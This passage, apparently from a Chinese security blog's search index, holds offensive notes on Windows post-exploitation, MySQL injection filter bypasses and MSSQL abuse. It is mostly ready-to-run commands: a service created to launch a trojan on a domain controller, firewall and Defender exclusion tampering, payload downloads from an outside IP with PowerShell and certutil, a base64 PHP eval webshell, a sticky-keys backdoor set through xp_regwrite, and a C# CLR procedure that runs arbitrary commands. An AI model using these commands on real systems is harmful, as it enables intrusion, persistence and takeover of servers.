advfirewall set allprofiles state off&quot;sc \\\\DC start wall# 执行木马sc \\\\DC create shell binpath&#x3D; &quot;c:\\shell.exe&quot;sc \\\\DC start shell</code></pre><h1 id="开关-3389-端口"><a href="#开关-3389-端口" class="headerlink" title="开关 3389 端口"></a>开关 3389 端口</h1><pre class="language-none"><code class="language-none"># 开启REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f# 关闭REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</code></pre><h1 id="开关-RDP"><a href="#开关-RDP" class="headerlink" title="开关 RDP"></a>开关 RDP</h1><pre class="language-none"><code class="language-none"># 开启wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1# 关闭wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 0</code></pre><h1 id="锁屏"><a href="#锁屏" class="headerlink" title="锁屏"></a>锁屏</h1><pre class="language-none"><code class="language-none">Rundll32.exe user32.dll，LockWorkStation</code></pre><h1 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h1><pre class="language-none"><code class="language-none">certutil.exe -urlcache -split -f [URL] output.file# base64解码certutil.exe -decode encode.file decode.file</code></pre><h1 id="查询-defender-白名单路径"><a href="#查询-defender-白名单路径" class="headerlink" title="查询 defender 白名单路径"></a>查询 defender 白名单路径</h1><pre class="language-none"><code class="language-none">reg query &quot;HKLM\SOFTWARE\Microsoft\windows Defender\Exclusions\Paths&quot;</code></pre><h1 id="修改-defender-白名单"><a href="#修改-defender-白名单" class="headerlink" title="修改 defender 白名单"></a>修改 defender 白名单</h1><pre class="language-none"><code class="language-none">Add-MpPreference -ExclusionPath &quot;C:\Utils&quot; # 添加白名单路径Add-MpPreference -ExclusionExtension &quot;C:\Utils\veil.exe&quot; # 添加白名单程序</code></pre><h1 id="PowerShell-下载远程文件"><a href="#PowerShell-下载远程文件" class="headerlink" title="PowerShell 下载远程文件"></a>PowerShell 下载远程文件</h1><pre class="language-none"><code class="language-none">powershell (new-object Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.93.100:8000&#x2F;win.exe&#39;,&#39;C:\win.exe&#39;)</code></pre><h1 id="替换文件中部分内容并写入到原文件"><a href="#替换文件中部分内容并写入到原文件" class="headerlink" title="替换文件中部分内容并写入到原文件"></a>替换文件中部分内容并写入到原文件</h1><pre class="language-none"><code class="language-none">powershell ((cat C:\Users\administrator\Desktop\info.txt) -replace &#39;somethings&#39;, &#39;anothor things&#39;) | set-content -path C:\Users\administrator\Desktop\info.txt</code></pre><h1 id="PowerShell-中使用其他用户身份执行命令"><a href="#PowerShell-中使用其他用户身份执行命令" class="headerlink" title="PowerShell 中使用其他用户身份执行命令"></a>PowerShell 中使用其他用户身份执行命令</h1><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$passwd</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">"PASSWORD"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token variable">$cred</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token punctuation">(</span><span class="token string">"DOMAIN\USERNAME"</span><span class="token punctuation">,</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token comment"># 执行命令</span><span class="token function">Invoke-Command</span> <span class="token operator">-</span>computername localhost <span class="token punctuation">[</span><span class="token operator">-</span>ConfigurationName dc_manage<span class="token punctuation">]</span> <span class="token operator">-</span>credential <span class="token variable">$cred</span> <span class="token operator">-</span>command <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName localhost <span class="token operator">-</span>Credential <span class="token variable">$cred</span> <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span></code></pre><h1 id="查找指定文件"><a href="#查找指定文件" class="headerlink" title="查找指定文件"></a>查找指定文件</h1><p>递归查询 C 盘下 index.html 文件路径</p><pre class="language-none"><code class="language-none">dir &#x2F;s &#x2F;b c:\index.html</code></pre><p>对无回显 RCE 的 web 机器可以通过配合该命令将命令执行结果写入到文件中，达到半回显效果</p><p>写入命令执行结果</p><pre class="language-none"><code class="language-none">for &#x2F;f %i in (&quot;dir &#x2F;s &#x2F;b c:\index.html&quot;) do (whoami &gt; %i\..\whoami.txt)</code></pre><p>写入一句话马</p><pre class="language-none"><code class="language-none">for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b c:\1.jpg&#39;) do (echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA&#x2F;Pgo&#x3D; &gt; %i\..\base64.txt)for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b c:\base64.txt&#39;) do (certutil.exe -decode %i\..\base64.txt %i\..\1.php)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL 关键字过滤 Bypass</title>
      <link href="/posts/53b8e68.html"/>
      <url>/posts/53b8e68.html</url>
      
        <content type="html"><![CDATA[<h1 id="过滤-information-schema"><a href="#过滤-information-schema" class="headerlink" title="过滤 information_schema"></a>过滤 information_schema</h1><p>在 mysql 5.7 中新增了 sys.schema,基础数据来自于 performance_chema 和 information_schema 两个库，本身数据库不存储数据</p><h2 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h2><p>存在自增字段时可以使用 <code>sys.schema_auto_increment_columns</code> 获取表名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> sys<span class="token punctuation">.</span>schema_auto_increment_columns <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h2><p>没有自增字段时可以使用 <code>sys.schema_table_statistics_with_buffer</code> 获取表名</p><pre class="language-sql" data-language="sql"><code class="language-sql">elect table_name <span class="token keyword">from</span> sys<span class="token punctuation">.</span>schema_table_statistics_with_buffer <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h2><p>使用 <code>join .. using</code> 获取字段名</p><p><code>select * from (select * from users as a join users as b)as c;</code></p><p>报错中可以得到第一个字段名</p><p><code>ERROR 1060 (42S21): Duplicate column name &#39;uid&#39;</code></p><p>将 <code>uid</code> 加入到 using 中</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">as</span> a <span class="token keyword">join</span> users <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">as</span> a <span class="token keyword">join</span> users <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>uid<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>MYSQL 版本大于 5.7，root 权限</p><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p>使用子查询可以在不知道列名的情况下获取数据</p><p>注意点</p><ul><li>要查询的列需要用 `` 来包裹</li><li>需要知道表中有多少列</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># admin 表存在</span><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>3<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span class="token comment"># ` 被过滤时使用别名代替</span><span class="token keyword">select</span> b <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span class="token comment"># 查询多列</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token identifier"><span class="token punctuation">`</span>3<span class="token punctuation">`</span></span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span></code></pre><h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><ul><li>使用注释绕过，<code>/**/</code>，<code>/*!*/</code></li><li>使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用 <code>()</code> 包围，并且两端可以没有多余的空格</li><li>使用其他空白符替代空格，<code>%20%09%0d %0b %0c %0d %a0%0a</code></li></ul><h1 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h1><p>使用 join 绕过</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">2</span><span class="token punctuation">)</span>b <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">4</span><span class="token punctuation">)</span>d<span class="token punctuation">)</span></code></pre><p>limit 的另一种写法：<code>limit M offset N</code>，等价于 <code>limit M, N</code></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/">https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MYSQL </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL 一般利用方式</title>
      <link href="/posts/5beaca16.html"/>
      <url>/posts/5beaca16.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SQL Server 是 Microsoft 开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的 DBMS 之一。SQL Server 具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等</p><p>在 2017 版之前，SQL Server 仅适用于 Windows。 SQL Server 2017 中最大的变化之一是，它现在可在 Linux 和 Docker 容器上使用。 这意味着可以在 Mac 上运行 SQL Server</p><h1 id="危险的存储过程"><a href="#危险的存储过程" class="headerlink" title="危险的存储过程"></a>危险的存储过程</h1><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><h3 id="查询-xp-cmdshell-存储过程是否存在"><a href="#查询-xp-cmdshell-存储过程是否存在" class="headerlink" title="查询 xp_cmdshell 存储过程是否存在"></a>查询 xp_cmdshell 存储过程是否存在</h3><p>xtype 为对象类型，xtype&#x3D;’x’，表示存储过程的对象类型为扩展存储过程</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span> <span class="token comment"># 存在则返回 1</span></code></pre><h3 id="xp-cmdshell-的开启与关闭"><a href="#xp-cmdshell-的开启与关闭" class="headerlink" title="xp_cmdshell 的开启与关闭"></a>xp_cmdshell 的开启与关闭</h3><p>开启</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span></code></pre><p>关闭</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span></code></pre><h3 id="恢复-xp-cmdshell-存储过程"><a href="#恢复-xp-cmdshell-存储过程" class="headerlink" title="恢复 xp_cmdshell 存储过程"></a>恢复 xp_cmdshell 存储过程</h3><p>Error Message: 未能找到存储过程 ‘master..xp_cmdshell’，即 xp_cmdshell 被删除，恢复方式如下</p><p>第一步删除</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">procedure</span> sp_addextendedproc<span class="token keyword">drop</span> <span class="token keyword">procedure</span> sp_oacreate<span class="token keyword">exec</span> sp_dropextendedproc <span class="token string">'xp_cmdshell'</span></code></pre><p>第二步恢复</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"sp_oacreate"</span><span class="token punctuation">,</span><span class="token string">"odsole70.dll"</span><span class="token punctuation">)</span><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"xp_cmdshell"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span></code></pre><p>上传 xplog70.dll，恢复扩展存储过过程 xp_cmdshell</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"xp_cmdshell"</span><span class="token punctuation">,</span><span class="token string">"xplog70.dll"</span><span class="token punctuation">)</span></code></pre><h2 id="注册表相关操作"><a href="#注册表相关操作" class="headerlink" title="注册表相关操作"></a>注册表相关操作</h2><p>SQL Server 存在一系列的存储过程，可以对注册表进行增删改查。xp_regread、xp_regwrite、xp_regdeletvalue、xp_regdeletkey、xp_regaddmultistring 等</p><h3 id="xp-regread-读注册表"><a href="#xp-regread-读注册表" class="headerlink" title="xp_regread 读注册表"></a>xp_regread 读注册表</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_regread <span class="token string">'HKEY_current_user'</span><span class="token punctuation">,</span><span class="token string">'Control Panel\International'</span><span class="token punctuation">,</span><span class="token string">'sCountry'</span><span class="token comment"># exec xp_regread [键], [子键], [键值]</span><span class="token keyword">exec</span> xp_regread N<span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span> N<span class="token string">'SYSTEM\CurrentControlSet\Services\MSSEARCH'</span> <span class="token comment"># 判断子健是否存在</span></code></pre><h3 id="xp-regaddmultistring-枚举可用的注册表键值"><a href="#xp-regaddmultistring-枚举可用的注册表键值" class="headerlink" title="xp_regaddmultistring 枚举可用的注册表键值"></a>xp_regaddmultistring 枚举可用的注册表键值</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_regenumkeys <span class="token string">'HKEY_CURRENT_USER'</span><span class="token punctuation">,</span><span class="token string">'Control Panel\International'</span></code></pre><h3 id="xp-regwrite-修改注册表"><a href="#xp-regwrite-修改注册表" class="headerlink" title="xp_regwrite 修改注册表"></a>xp_regwrite 修改注册表</h3><p>查看 xp_regwrite 是否启用</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_regwrite'</span></code></pre><p>开启 xp_regwrite</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_regwrite'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span></code></pre><p>关闭 xp_regwrite</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_regwrite'</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">RECONFIGURE</span></code></pre><p>修改注册表</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> xp_regwrite <span class="token variable">@rootkey</span><span class="token operator">=</span><span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span><span class="token variable">@key</span><span class="token operator">=</span><span class="token string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE'</span><span class="token punctuation">,</span><span class="token variable">@value_name</span><span class="token operator">=</span><span class="token string">'Debugger'</span><span class="token punctuation">,</span><span class="token variable">@type</span><span class="token operator">=</span><span class="token string">'REG_SZ'</span><span class="token punctuation">,</span><span class="token variable">@value</span><span class="token operator">=</span><span class="token string">'c:\windows\system32\cmd.exe'</span><span class="token comment"># 修改粘滞键的键值</span></code></pre><h3 id="xp-regdeletekey-删除指定注册表键值对"><a href="#xp-regdeletekey-删除指定注册表键值对" class="headerlink" title="xp_regdeletekey 删除指定注册表键值对"></a>xp_regdeletekey 删除指定注册表键值对</h3><p>删除粘滞键的键值</p><pre class="language-sql" data-language="sql"><code class="language-sql">xp_regdeletekey <span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span> <span class="token string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'</span></code></pre><h2 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h2><p>判读文件是否存在，第一列返回 0 表示文件不存在，返回 1 表示文件存在。当执行完无回显命令时，一般都将结果输入至文件中，利用此存储过程可以判断无回显命令是否执行成功</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_fileexist <span class="token string">'C:\Users\MSSQLSERVER\1.txt'</span></code></pre><h2 id="xp-subdirs"><a href="#xp-subdirs" class="headerlink" title="xp_subdirs"></a>xp_subdirs</h2><p>列出当前目录</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_subdirs <span class="token string">"C:\\"</span></code></pre><h2 id="xp-getnetname"><a href="#xp-getnetname" class="headerlink" title="xp_getnetname"></a>xp_getnetname</h2><p>获取服务器名称</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_getnetname</code></pre><h2 id="xp-msver"><a href="#xp-msver" class="headerlink" title="xp_msver"></a>xp_msver</h2><p>获取服务器信息</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_msver</code></pre><h1 id="SQL-Server-COM-组件"><a href="#SQL-Server-COM-组件" class="headerlink" title="SQL Server COM 组件"></a>SQL Server COM 组件</h1><p>SQL Server 中的 COM 组件 SP_OACREATE，执行系统命令，但是此利用方法无回显</p><h2 id="查询-SP-OACREATE-是否存在"><a href="#查询-SP-OACREATE-是否存在" class="headerlink" title="查询 SP_OACREATE 是否存在"></a>查询 SP_OACREATE 是否存在</h2><p>返回 1 则存在</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'SP_OACREATE'</span></code></pre><h2 id="SP-OACREATE-的开启与关闭"><a href="#SP-OACREATE-的开启与关闭" class="headerlink" title="SP_OACREATE 的开启与关闭"></a>SP_OACREATE 的开启与关闭</h2><p>开启</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span>   <span class="token keyword">exec</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span></code></pre><p>关闭</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span>   <span class="token keyword">exec</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span></code></pre><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">declare</span> <span class="token variable">@shell</span> <span class="token keyword">int</span> <span class="token keyword">exec</span> sp_oacreate <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span><span class="token variable">@shell</span> output <span class="token keyword">exec</span> sp_oamethod <span class="token variable">@shell</span><span class="token punctuation">,</span><span class="token string">'run'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token string">'C:\Windows\System32\cmd.exe /c whoami /all > C:\\Users\\MSSQLSERVER\\test.txt'</span></code></pre><h1 id="SQL-Server-CLR-相关利用"><a href="#SQL-Server-CLR-相关利用" class="headerlink" title="SQL Server CLR 相关利用"></a>SQL Server CLR 相关利用</h1><p>公共语言运行时 (CLR) 集成编程概念<br>从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数</p><p>CLR 方式可以利用 16 进制文件流方式导入 DLL 文件，不需要文件落地</p><p>利用步骤</p><ol><li>编写 CLR</li><li>启用 MSSQL CLR 功能</li><li>利用 SQL 语句导入程序集</li><li>执行系统命令</li></ol><h2 id="编写-CLR"><a href="#编写-CLR" class="headerlink" title="编写 CLR"></a>编写 CLR</h2><p>使用 Visual Studio 创建工程</p><p><img src="/posts/5beaca16/image-20220320205141716.png" alt="image-20220320205141716"></p><p>修改目标平台和勾选创建脚本，这里是 SQL Server 2014</p><p><img src="/posts/5beaca16/image-20220320205354905.png" alt="image-20220320205354905"></p><p>修改目标框架和权限级别为 UNSAFE</p><p><img src="/posts/5beaca16/image-20220320205406216.png" alt="image-20220320205406216"></p><blockquote><p>在 SQL Server 2005 中引入了从 MSSQL 运行.NET 代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net 程序集时，会给它们指定一个权限级别<br>其权限集有三个选项</p><blockquote><p>SAFE：基本上只将 MSSQL 数据集暴露给代码，其他大部分操作则都被禁止<br>EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码<br>UNSAFE：允许使用任何代码</p></blockquote></blockquote><p>创建 SQL CLR C# 存储过程</p><p><img src="/posts/5beaca16/image-20220320205413749.png" alt="image-20220320205413749"></p><p>代码如下</p><pre class="language-c#" data-language="c#"><code class="language-c#">using System;using System.Data;using System.Data.SqlClient;using System.Data.SqlTypes;using System.Diagnostics;using System.Text;using Microsoft.SqlServer.Server;public partial class StoredProcedures&#123;    [Microsoft.SqlServer.Server.SqlProcedure]    public static void ExecCommand (string cmd)    &#123;        &#x2F;&#x2F; 在此处放置代码        SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;);        SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; &#x2F;c &quot; + cmd));    &#125;    public static string RunCommand(string filename,string arguments)    &#123;        var process &#x3D; new Process();        process.StartInfo.FileName &#x3D; filename;        if (!string.IsNullOrEmpty(arguments))        &#123;            process.StartInfo.Arguments &#x3D; arguments;        &#125;        process.StartInfo.CreateNoWindow &#x3D; true;        process.StartInfo.WindowStyle &#x3D; ProcessWindowStyle.Hidden;        process.StartInfo.UseShellExecute &#x3D; false;        process.StartInfo.RedirectStandardError &#x3D; true;        process.StartInfo.RedirectStandardOutput &#x3D; true;        var stdOutput &#x3D; new StringBuilder();        process.OutputDataReceived +&#x3D; (sender, args) &#x3D;&gt; stdOutput.AppendLine(args.Data);        string stdError &#x3D; null;        try        &#123;            process.Start();            process.BeginOutputReadLine();            stdError &#x3D; process.StandardError.ReadToEnd();            process.WaitForExit();        &#125;        catch (Exception e)        &#123;            SqlContext.Pipe.Send(e.Message);        &#125;        if (process.ExitCode &#x3D;&#x3D; 0)        &#123;            SqlContext.Pipe.Send(stdOutput.ToString());        &#125;        else        &#123;            var message &#x3D; new StringBuilder();            if (!string.IsNullOrEmpty(stdError))            &#123;                message.AppendLine(stdError);            &#125;            if (stdOutput.Length !&#x3D; 0)            &#123;                message.AppendLine(&quot;Std output:&quot;);                message.AppendLine(stdOutput.ToString());            &#125;            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code &#x3D; &quot; + process.ExitCode + &quot;: &quot; + message);        &#125;        return stdOutput.ToString();    &#125;&#125;</code></pre><p>编译生成 DLL</p><p><img src="/posts/5beaca16/image-20220320205430338.png" alt="image-20220320205430338"></p><h2 id="启用-CLR"><a href="#启用-CLR" class="headerlink" title="启用 CLR"></a>启用 CLR</h2><h3 id="SQL-Server-2017-版本之前"><a 